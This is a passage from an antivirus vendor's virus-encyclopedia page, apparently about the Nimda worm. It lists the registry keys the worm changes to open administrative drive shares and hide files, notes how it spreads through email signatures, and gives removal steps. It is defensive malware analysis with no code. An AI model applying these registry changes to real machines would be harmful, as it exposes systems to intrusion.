 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\
  Flags = 
  Parm1enc =
  Parm2enc =

 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\X$
  Flags =
  Parm1enc =
  Parm2enc =
  Path = 
  Remark = 
  Type = 
</pre>
 where "X$" are "C$", "D$", e.t.c. 
<pre>
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
  Hidden
  ShowSuperHidden
  HideFileExt
</pre>
These keys are deleted:
<pre>
 HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\Shares\Security
</pre>

<H4>Side Effects</H4>

The auto-signature HTML file may be affected as well by JavaScript, as it is
described above. As a result all messages that are sent from the infected machine
will have the worm's JavaScript attached to the end of the signature. So the worm can
spread in the same way as "KakWorm" 
<p>
<A NAME="remove"></A>
<H4>Removal</H4>

Download and run <A HREF="/files/AntiNimd.exe"><B>AntiNimd.exe</B></A>.
<p>

This tool runs on Windows 9x\ME\NT\2000 and will do the following:
<ol>
<li>stops virus processes:<br>
	MMC.EXE<br>
	LOAD.EXE<br>
	ADMIN.DLL<br>
	RICHED20.DLL<br>
<li>scans all hard drives and cures or deletes infected files
<li>restores "SHELL=Explorer.exe" in SYSTEM.INI 
<li>deletes all temporary files
<li>deletes all NetWork shares
<li>creates new RichEd20.dll in the SYSTEM or SYSTEM32 folder.
</ol>

</td></tr>
</table>

<TABLE width=560 border=0 cellpadding=0 cellspacing=0>
<tr><td BGCOLOR="#ffffff" valign=center align=right>

<CENTER>


<img src="/images/bar1.gif" vspace=4><br clear=all>
<MAP NAME="menu">
<AREA SHAPE=RECT COORDS="3,2,51,62" HREF="/E/products.htm" ALT="Products">
<AREA SHAPE=RECT COORDS="54,1,109,62" HREF="/E/download.htm" ALT="Download">
<AREA SHAPE=RECT COORDS="110,1,158,62" HREF="/E/purchase.htm" ALT="Purchase">
<AREA SHAPE=RECT COORDS="161,2,204,62" HREF="/E/support.htm" ALT="Support">
<AREA SHAPE=RECT COORDS="206,1,250,62" HREF="/E/thelab.htm" ALT="TheLab">
</MAP>
<img ismap src="/images/menu.gif" usemap="#menu" align=left vspace=10 border=0>

<FORM METHOD=GET ACTION="http://www.avp.ch/cgi-bin/searchx.plx" NAME="SearchForm">

<INPUT TYPE="hidden" NAME="Range" VALUE="All">
<INPUT TYPE="hidden" NAME="Format" VALUE="Standard">
<INPUT NAME="Terms" SIZE=20 MAXLENGTH=100 VALUE="">
<INPUT TYPE=submit VALUE="Search!">

</FORM>
<CENTER>
<BR>
<FONT SIZE="-1"><B>Virus analysis texts &copy; Copyright 1996-2000 Eugene Kaspersky.</B><BR>
Web-version &copy;  <A HREF="http://www.avp.ch/copyrite.htm">Copyright</A> Metropolitan Network BBS Inc. 1996-2000.  All Rights reserved.<BR>
Send your questions and suggestions to 
<A HREF="http://www.avp.ch/E/feedback.htm">webmaster</A></I></FONT>
<P>
</CENTER>
</td>
</tr>
</table>



</BODY></HTML>

